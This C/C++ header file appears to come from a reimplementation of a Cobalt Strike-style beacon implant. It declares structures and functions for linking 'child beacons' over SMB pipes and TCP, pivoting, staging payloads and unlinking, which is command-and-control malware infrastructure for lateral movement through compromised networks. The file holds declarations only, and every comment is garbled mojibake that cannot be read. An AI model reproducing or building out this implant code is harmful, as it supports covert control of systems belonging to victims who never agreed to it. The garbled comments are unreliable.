#pragma once
#include "comm.h"
#include "common.h"
/////////////////////////////////////




/// <summary>
/// tcp��smb��beacon�Ľṹ��
/// </summary>
struct ChildBeacon
{
	HANDLE smb;			/*smb beacon���Ӿ��*/
	SOCKET tcp;			/*tcp beacon���Ӿ��*/
	int(*recvChildBeacon)(ChildBeacon*, char*, int);/*��ȡbeacon���*/
	int(*sendChildBeacon)(ChildBeacon*, char*, int); /*��beacon��������*/
	int(*closeChildBeacon)(ChildBeacon*); /*�ر�beacon����*/
	BOOL(*FlushFileBuffers)(ChildBeacon*);/*smb beacon����*/
	int(*checkChildBeacon)(ChildBeacon*, int);/*���beacon����*/
	void* null2; /*�պ���*/
};
typedef int (__cdecl* recvChildBeacon_ptr)(ChildBeacon*, char*, int);
typedef int(__cdecl* sendChildBeacon_ptr)(ChildBeacon*, char*, int); /*��beacon��������*/
typedef int(__cdecl* closeChildBeacon_ptr)(ChildBeacon*); /*�ر�beacon����*/
typedef BOOL(__cdecl* FlushFileBuffers_ptr)(ChildBeacon*);/*smb beacon����*/
typedef int(__cdecl* checkChildBeacon_ptr)(ChildBeacon*, int);/*���beacon����*/

struct ChildBeaconInfo
{
	int ChildBeaconId; /*��beacon id*/
	ChildBeacon ChildBeaconConfig; /*��beacon��Ϣ*/
	int state; /*��beacon״̬*/
	char* ChildBeaconData; /*����*/
	int ChildBeaconDataSize;
	int time;
};

extern ChildBeaconInfo gChildBeaconInfo[40];
extern int gChildBeaconInfoSize;

void BeaconRequestChildBeacon(char* Taskdata, int Task_size);


void BeaconUnlink(u_long ChildBeaconId);

int SendStageTCP(char* Taskdata, int Task_size);

void link_Smb_Beacon(char* Taskdata);

void BeaconTcpPivot(char* Taskdata, int TaskdataSize);

void connect_tcp_child_Beacon(char* Taskdata, int Task_size);

ChildBeacon* InitTcpChildBeacon(SOCKET conn, ChildBeacon* pTcpBeacon);

int __cdecl AddChildBeacon(u_long port,ChildBeacon* smb,ChildBeacon* tcp, recvChildBeacon_ptr recvChildBeacon, sendChildBeacon_ptr sendChildBeacon, closeChildBeacon_ptr closeChildBeacon,void* BeaconNULL, checkChildBeacon_ptr checkChildBeacon);

void CheckChildBeacon();

int RecvSmbData(HANDLE hFile, char* buffer, int size);